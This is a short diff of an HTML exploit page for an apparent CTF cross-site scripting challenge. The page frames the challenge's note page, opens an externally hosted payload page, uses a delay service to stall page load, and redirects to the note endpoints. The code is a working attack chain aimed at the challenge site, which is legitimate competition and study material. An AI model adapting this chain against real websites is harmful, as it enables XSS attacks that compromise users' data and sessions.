@@ -10,7 +10,7 @@
     </form>
 
   <iframe name="user" src="https://tbdxss.chal.perfect.blue/note"></iframe>
-   <img src="http://deelay.me/10000/http://example.com"/>
+   <!-- <img src="http://deelay.me/10000/http://example.com"/> -->
 
   <script>
     function test() { 
@@ -44,12 +44,13 @@
         // document.myform.submit();
         window.open('https://thomasf0x.github.io/coolxsspayloadiguess/index2.html', '_blank'); // open the window with xss we se before ( note )
       setTimeout(function () {
-        window.location.assign('http://deelay.me/1000/https://tbdxss.chal.perfect.blue/change_note');
+        window.location = 'http://deelay.me/1000/https://tbdxss.chal.perfect.blue/note';
 
       }, 2000);
 
     }, 2000);
   });
   </script>
+   <img src="http://deelay.me/10000/http://example.com"/>
   </body>
 </html>
